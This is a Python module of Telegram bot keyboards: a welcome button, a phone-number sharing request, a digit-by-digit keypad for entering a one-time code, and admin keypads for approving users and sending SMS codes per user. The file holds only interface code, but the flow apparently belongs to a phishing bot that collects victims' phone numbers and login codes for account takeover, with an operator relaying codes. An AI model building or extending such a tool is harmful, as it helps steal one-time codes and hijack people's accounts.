from telegram import InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup

def get_welcome_keyboard():
    keyboard = [[InlineKeyboardButton("Proceed Automatically 🚀", callback_data="proceed")]]
    return InlineKeyboardMarkup(keyboard)

def get_contact_keyboard():
    # This needs to be a ReplyKeyboardMarkup to request the phone number
    keyboard = [[KeyboardButton("Share Phone Number 📱", request_contact=True)]]
    return ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)

def get_otp_keyboard(current_code=""):
    keyboard = []
    # 1-3
    keyboard.append([
        InlineKeyboardButton("1", callback_data="num_1"),
        InlineKeyboardButton("2", callback_data="num_2"),
        InlineKeyboardButton("3", callback_data="num_3")
    ])
    # 4-6
    keyboard.append([
        InlineKeyboardButton("4", callback_data="num_4"),
        InlineKeyboardButton("5", callback_data="num_5"),
        InlineKeyboardButton("6", callback_data="num_6")
    ])
    # 7-9
    keyboard.append([
        InlineKeyboardButton("7", callback_data="num_7"),
        InlineKeyboardButton("8", callback_data="num_8"),
        InlineKeyboardButton("9", callback_data="num_9")
    ])
    # 0, Clear, Submit
    keyboard.append([
        InlineKeyboardButton("❌ Clear", callback_data="num_clear"),
        InlineKeyboardButton("0", callback_data="num_0"),
        InlineKeyboardButton("✅ Send", callback_data="num_submit")
    ])
    
    return InlineKeyboardMarkup(keyboard)

def get_admin_approval_keyboard(user_id):
    keyboard = [
        [
            InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}"),
            InlineKeyboardButton("❌ Reject", callback_data=f"reject_{user_id}")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_admin_sms_keyboard(user_id):
    # Keyboard for admin to send SMS buttons (1-0)
    keyboard = []
    row = []
    for i in range(1, 10):
        row.append(InlineKeyboardButton(str(i), callback_data=f"admin_sms_{user_id}_{i}"))
        if len(row) == 3:
            keyboard.append(row)
            row = []
    keyboard.append([
        InlineKeyboardButton("0", callback_data=f"admin_sms_{user_id}_0"),
        InlineKeyboardButton("Done ✅", callback_data=f"admin_sms_done_{user_id}")
    ])
    return InlineKeyboardMarkup(keyboard)
